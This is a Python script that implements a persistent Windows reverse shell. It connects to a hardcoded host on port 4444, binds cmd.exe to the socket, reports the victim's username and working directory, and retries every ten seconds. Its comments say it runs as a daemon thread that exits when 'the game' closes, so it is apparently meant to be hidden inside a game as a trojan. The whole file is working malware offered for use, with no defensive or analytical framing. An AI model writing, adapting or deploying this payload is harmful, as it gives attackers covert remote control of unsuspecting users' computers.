import socket
import subprocess
import os
import threading

# --- CONFIGURATION ---
# Replace this with YOUR public-facing IP address or domain name.
# This is where the shell will connect back to.
RHOST = "172.18.160.1"
# Replace this with the port you will be listening on with netcat or another listener.
RPORT = 4444
# ---------------------

def connect_and_serve():
    """
    Establishes the reverse connection and serves the interactive shell.
    This function will be run in a loop to ensure persistence.
    """
    while True:
        try:
            # Create the socket and connect back to the master.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            # Redirect stdin, stdout, and stderr of a new cmd.exe process to the socket.
            # This is the core of the interactive shell.
            p = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
                                 stdout=s.fileno(),
                                 stderr=s.fileno(),
                                 stdin=s.fileno())
            
            # Send a banner to the master to confirm connection.
            # os.getlogin() gets the current user's name.
            # os.getcwd() gets the current working directory.
            s.send(f"[+] Connection established from user: {os.getlogin()} in directory: {os.getcwd()}\n".encode())
            s.send("PS ".encode() + os.getcwd().encode() + b'>')

            # Wait for the process to complete (which it won't until the connection is closed).
            p.wait()

        except Exception as e:
            # If anything goes wrong (e.g., master is not listening),
            # wait for 10 seconds and try to connect again. This ensures persistence.
            import time
            time.sleep(10)

# Create a daemon thread to run the shell logic.
# A daemon thread will exit immediately when the main program (the game) exits.
# This prevents the shell from hanging if the user closes the game.
shell_thread = threading.Thread(target=connect_and_serve)
shell_thread.daemon = True
shell_thread.start()

# Keep the payload script running in the background.
# A simple infinite loop will suffice since it's running in a thread.
while True:
    import time
    time.sleep(3600)